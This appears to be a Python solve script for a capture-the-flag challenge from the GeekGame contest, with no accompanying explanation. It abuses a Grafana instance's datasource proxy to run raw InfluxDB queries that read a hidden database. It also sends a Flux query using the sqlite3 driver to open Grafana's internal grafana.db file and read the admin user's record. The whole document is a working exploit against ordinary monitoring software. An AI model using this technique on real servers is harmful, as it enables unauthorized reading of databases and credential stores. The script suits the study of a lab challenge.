import requests
import binascii

HOST = 'https://prob04-3yteyi8m.geekgame.pku.edu.cn'

ds_uid = requests.get(
    f'{HOST}/api/datasources',
    auth=('geekgame', 'geekgame'),
    cookies=COOKIES,
).json()[0]['uid']

print('ds_uid', ds_uid)

def get_flag1():
    res = requests.post(
        f'{HOST}/api/datasources/proxy/uid/{ds_uid}/query',
        auth=('geekgame', 'geekgame'),
        cookies=COOKIES,
        data={
            'q': 'show databases',
        },
    ).json()
    
    db_name = None
    for v in res['results'][0]['series'][0]['values']:
        if v[0].startswith('secret_'):
            db_name = v[0]
            break
    else:
        raise RuntimeError(res)
        
    print('db_name', db_name)
    
    res = requests.post(
        f'{HOST}/api/datasources/proxy/uid/{ds_uid}/query',
        auth=('geekgame', 'geekgame'),
        cookies=COOKIES,
        data={
            'q': f'select value from {db_name}..flag1',
        },
    ).json()
    
    flag = res['results'][0]['series'][0]['values'][0][1]
    print(flag)
    
def get_flag2():
    res = requests.post(
        f'{HOST}/api/datasources/proxy/uid/{ds_uid}/api/v2/query?org=org',
        auth=('geekgame', 'geekgame'),
        cookies=COOKIES,
        headers={
            'Content-Type': 'application/vnd.flux',
            'X-DS-Authorization': 'Token token',
        },
        data='''
            import "sql"
            sql.from(
                driverName: "sqlite3",
                dataSourceName: "file:/var/lib/grafana/grafana.db",
                query: "SELECT email FROM user WHERE login='admin'",
            )
        '''
    ).text
    print(res)
    flag_hex = res.partition(',_result,0,')[2].strip()
    print(binascii.unhexlify(flag_hex.encode()).decode())
    
get_flag1()
get_flag2()